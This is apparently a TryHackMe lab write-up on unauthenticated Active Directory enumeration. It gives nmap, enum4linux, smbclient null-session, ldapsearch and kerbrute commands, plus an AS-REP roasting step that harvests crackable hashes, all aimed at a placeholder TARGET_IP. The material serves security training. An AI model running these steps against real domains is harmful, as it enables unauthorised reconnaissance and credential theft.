# 🏢 AD: Basic Enumeration

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [AD: Basic Enumeration](https://tryhackme.com/room/adbasicenumeration) |
| **Difficulty** | 🟢 Easy |
| **Category** | Active Directory |
| **OS** | Windows |
| **Tools** | nmap, enum4linux, smbclient, kerbrute, ldapsearch |

---

## 🎯 Objective

Learn unauthenticated Active Directory enumeration techniques to gather intelligence about domain users, groups, shares, and policies.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,3269 TARGET_IP
```

**Key AD ports:**
```
53/tcp   DNS
88/tcp   Kerberos
135/tcp  RPC
139/tcp  NetBIOS
389/tcp  LDAP
445/tcp  SMB
636/tcp  LDAPS
3268/tcp Global Catalog
```

---

## 🌐 SMB Enumeration (Unauthenticated)

```bash
# Null session enumeration
enum4linux -a TARGET_IP

# List shares
smbclient -L //TARGET_IP -N

# Connect to share
smbclient //TARGET_IP/SHARE_NAME -N
ls
get file.txt
```

---

## 📁 LDAP Enumeration (Unauthenticated)

```bash
# Basic LDAP query
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local"

# Get users
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# Get groups
ldapsearch -x -H ldap://TARGET_IP -b "DC=domain,DC=local" "(objectClass=group)"
```

---

## 👤 User Enumeration

```bash
# Kerbrute — enumerate valid usernames via Kerberos
kerbrute userenum --dc TARGET_IP -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# AS-REP Roasting — find users without pre-auth required
GetNPUsers.py domain.local/ -dc-ip TARGET_IP -no-pass -usersfile users.txt
```

---

## 📚 Lessons Learned

- Many AD environments allow unauthenticated SMB and LDAP queries — a significant information leak
- User enumeration via Kerberos (Kerbrute) doesn't require credentials and leaves minimal logs
- SMB null sessions can reveal domain users, groups, shares, and password policies
- AS-REP Roasting targets accounts with pre-authentication disabled — hashes are crackable offline

---
*by OwlRC 🦉 | github.com/OwlRC*
